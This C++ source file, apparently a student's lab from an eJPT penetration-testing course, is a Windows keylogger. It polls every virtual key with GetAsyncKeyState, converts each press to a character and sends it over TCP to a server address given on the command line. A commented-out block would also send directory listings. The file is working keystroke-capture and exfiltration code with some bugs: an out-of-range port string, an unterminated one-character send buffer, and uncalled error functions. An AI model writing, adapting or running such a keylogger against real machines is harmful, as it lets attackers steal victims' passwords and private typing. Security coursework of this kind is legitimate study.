/*
Xiao Kuang
5/28/2020
www.elearnsecurity.com
Pentest Student Course, eJPT Certification
C++ Programming Lab, Task 2: Create a simple keylogger that sends any collected information back to the penetration tester
This is to be compiled on a Windows machine:
g++ -g -o task2.exe task2.cpp -lws2_32 -std=c++17
To run in Powershell: task2.exe "<ip address of server>"
*/

#define _WIN32_WINNT 0x501
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <string>
#include <filesystem>
#include <thread>
#include <Winuser.h>


using namespace std;
namespace fs = std::filesystem;

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Mswsock.lib")
#pragma comment(lib, "AdvApi32.lib")
#define DEFAULT_PORT "207015"
// #define _WIN32_WINNT 0x501

string get_stem(const fs::path &p) { return (p.stem().string()); }

int main(int argc, char **argv)
{
    // ShowWindow(GetConsoleWindow(), SW_HIDE);

    WSADATA wsaData;
    int iResult;
    struct addrinfo *result = NULL, *ptr = NULL, hints;

    ZeroMemory(&hints, sizeof(hints));

    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData); //MAKEWORD(2,2) makes request for v2.2 of Winsock
    if (iResult != 0)
    {
        printf("WSAStartup failed: %d\n", iResult);
        return 1;
    }

    // resolve the server address and port
    // getaddrinfo request IP address for server name passed on commandline
    iResult = getaddrinfo(argv[1], DEFAULT_PORT, &hints, &result);
    if (iResult != 0)
    {
        printf("getaddrinfo failed: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // create a SOCKET object
    SOCKET ConnectSocket = INVALID_SOCKET;

    // call sockets function and return its value to ConnectSocket object
    ptr = result; // these are both struct addrinfo.  result was populated from previous getaddrinfo()
    // create a SOCKET for connecting to server
    ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
    // check for errors
    if (ConnectSocket == INVALID_SOCKET)
    {
        printf("Error at socket(): %ld\n", WSAGetLastError); // WSAGetLastError returns error number associated with last error
        freeaddrinfo(result);
        WSACleanup(); // used to terminate the use of WS2_32 DLL
        return 1;
    }

    // call the connect function, passing the created socket and the sockaddr struct as params
    iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
    if (iResult == SOCKET_ERROR)
    {
        closesocket(ConnectSocket);
        ConnectSocket = INVALID_SOCKET;
    }
    freeaddrinfo(result);
    if (ConnectSocket == INVALID_SOCKET)
    {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }

    // string path = "./";
    // string sendBuf = "";

    // for (const auto &entry : fs::directory_iterator(path))
    // {
    //     // do a check if it is a directory.  if it is, add a '/' at the front.
    //     if (entry.is_directory())
    //     {
    //         sendBuf = "/" + get_stem(entry.path()) + "\n";
    //     }
    //     else
    //     {
    //         sendBuf = get_stem(entry.path()) + "\n";
    //     }
    //     iResult = send(ConnectSocket, sendBuf.c_str(), (int)strlen(sendBuf.c_str()), 0);
    //     if (iResult == SOCKET_ERROR)
    //     {
    //         printf("send failed: %d\n", WSAGetLastError);
    //         closesocket(ConnectSocket);
    //         WSACleanup();
    //         return 1;
    //     }
    // }
    char *sendBuf = NULL;
    int keyState = 0;
    while (1)
    {
        Sleep(100);
        
        for (int i = 0; i < 255; i++)
        {
            keyState = GetAsyncKeyState(i);

            if (keyState == 1 || keyState == -32767)
            {
                printf("Made it here!.  i is: %d\n", i);
                // convert vkey to char
                char thisChar = MapVirtualKeyA(i, MAPVK_VK_TO_CHAR);
                sendBuf = &thisChar;
                // sprintf(sendBuf, "%d", i);                    
                // key has been pressed, send to server
                iResult = send(ConnectSocket, sendBuf, (int)strlen(sendBuf), 0);
                if (iResult == SOCKET_ERROR){
                    printf("send failed: %d\n", WSAGetLastError);
                    closesocket(ConnectSocket);
                    WSACleanup();
                    return 1;
                }
                break;
            }
        }
    }

    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR)
    {
        printf("shutdown failed: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    return 0;
}
